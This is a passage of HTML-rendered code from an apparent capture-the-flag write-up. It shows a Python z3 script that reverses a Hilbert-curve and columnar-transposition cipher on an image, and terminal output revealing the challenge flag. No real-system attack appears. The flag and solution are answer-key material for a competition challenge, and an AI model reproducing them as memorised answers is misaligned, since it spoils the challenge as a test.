style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">encrypt\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_, key, n):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> buf\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_key \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">ord\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> key]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">img \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Image.open(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"enc.png\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">img \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img.rotate(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">90\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">pix \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> img.load()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">actual_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (x, y), v \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> table.items():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">actual_msg[v] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> pix[x, y][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(key)):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">w \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_key)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">h \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">//\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">arr \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [[_msg[w\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y] \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w\u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(h)] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> y \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_conf \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">sorted\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">([(_key[i], i) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_marshal \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [arr[_conf[i][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]] \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> functools.reduce(\u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> a, r: a \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _marshal[r], \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(w), [])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">list\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">filter\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x: x \u003C/span>\u003Cspan style=\"--0:#F97583\">is\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, _msg))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">_msg \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [(_msg[_] \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _key[_ \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> w]) \u003C/span>\u003Cspan style=\"--0:#F97583\">%\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">256\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">range\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(n\u003C/span>\u003Cspan style=\"--0:#F97583\">**\u003C/span>\u003Cspan style=\"--0:#79B8FF\">2\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># new z3 solve\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> Solver()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sym, actual \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">zip\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(_msg, actual_msg):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(sym \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> actual)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sym \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> buf:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(sym \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">32\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">solver.add(sym \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">127\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> solver\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"BUILDING EQUATION\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">solver \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> encrypt(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, key, n)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"SOLVING FOR SATISFYING FLAG\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> solver.check() \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> sat:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">m \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> solver.model()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">''\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.join(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">chr\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(m[b].as_long()) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> b \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> buf))\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"import functoolsfrom PIL import Imagefrom z3 import *key = &#x22;k3Y&#x22;n = 256def sox(n, d):  x, y, t = 0, 0, d  for s in range(n - 1):    u = 1 &#x26; t // 2    v = 1 &#x26; t ^ u    x, y = spin(2**s, x, y, u, v)    x += 2**s * u    y += 2**s * v    t = t // 4  return x, ydef spin(n, x, y, u, v):  if v == 0:    if u == 1:      x = n - 1 - x      y = n - 1 - y    x, y = y, x  return x, yimport picklewith open(&#x22;hilbert.json&#x22;, &#x27;rb&#x27;) as f:  table = pickle.load(f)buf = [Int(f&#x22;F_{i}&#x22;) for i in range(n**2)]def encrypt(_, key, n):  _msg = buf  _key = [ord(_) for _ in key]  img = Image.open(&#x22;enc.png&#x22;)  img = img.rotate(90)  pix = img.load()  actual_msg = [0 for _ in range(n**2)]  for (x, y), v in table.items():    actual_msg[v] = pix[x, y][0]  for _ in range(len(key)):    w = len(_key)    h = n**2 // w + 1    arr = [[_msg[w*x + y] if w*x + y \u003C n**2 else None for x in range(h)] for y in range(w)]    _conf = sorted([(_key[i], i) for i in range(w)])    _marshal = [arr[_conf[i][1]] for i in range(w)]    _msg = functools.reduce(lambda a, r: a + _marshal[r], range(w), [])    _msg = list(filter(lambda x: x is not None, _msg))    _msg = [(_msg[_] + _key[_ % w]) % 256 for _ in range(n**2)]    # new z3 solve    solver = Solver()    for sym, actual in zip(_msg, actual_msg):      solver.add(sym == actual)    for sym in buf:      solver.add(sym > 32)      solver.add(sym \u003C 127)  return solverprint(&#x22;BUILDING EQUATION&#x22;)solver = encrypt(None, key, n)print(&#x22;SOLVING FOR SATISFYING FLAG&#x22;)if solver.check() == sat:  m = solver.model()  print(&#x27;&#x27;.join(chr(m[b].as_long()) for b in buf))\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Which prints the entire message including the padding. But the flag is visible at the very start.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"console\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0\">abhi@abhi-omen:~/CryptoCTF/bert/Bertrand\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">$ python sym.py\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">BUILDING EQUATION\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">SOLVING FOR SATISFYING FLAG\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">CCTF{3nCrypTioN_8Y_c0lUmn4R_7rAnSp05it!On!}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...\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"abhi@abhi-omen:~/CryptoCTF/bert/Bertrand$ python sym.pyBUILDING EQUATIONSOLVING FOR SATISFYING 